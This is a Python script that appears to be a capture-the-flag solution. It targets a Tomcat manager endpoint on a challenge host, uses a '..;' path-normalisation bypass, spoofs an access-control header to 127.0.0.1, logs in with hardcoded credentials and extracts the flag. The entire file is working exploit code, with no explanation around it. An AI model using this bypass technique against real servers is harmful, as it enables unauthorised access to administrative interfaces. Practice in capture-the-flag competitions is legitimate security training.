import requests
import re
from requests.auth import HTTPBasicAuth

# target
BASE_URL = "http://doubleshop.srdnlen.it/"

USERNAME = "adm1n"
PASSWORD = "317014774e3e85626bd2fa9c5046142c"
EXPLOIT_PATH = "/api/a/..;/manager/html"

def solve():
    target_url = f"{BASE_URL}{EXPLOIT_PATH}"
    
    headers = {
        "X-Access-Manager": "127.0.0.1",
    }

    print(f"[*] Avvio exploit su: {target_url}")
    print(f"[*] Header impostato: X-Access-Manager: 127.0.0.1")

    try:
        response = requests.get(
            target_url,
            auth=HTTPBasicAuth(USERNAME, PASSWORD),
            headers=headers,
            timeout=10
        )

        if response.status_code == 200:
            
            flag_match = re.search(r"srdnlen\{.*\}", response.text)
            
            if flag_match:
                print(f"\n[!] FLAG: {flag_match.group(0)}")
            else:
                print("[-] no flag")
        else:
            print(f"[-] status code: {response.status_code}")

    except requests.exceptions.ConnectionError:
        print("[-] connection error")
    except Exception as e:
        print(f"[-] error> {e}")

if __name__ == "__main__":
    solve()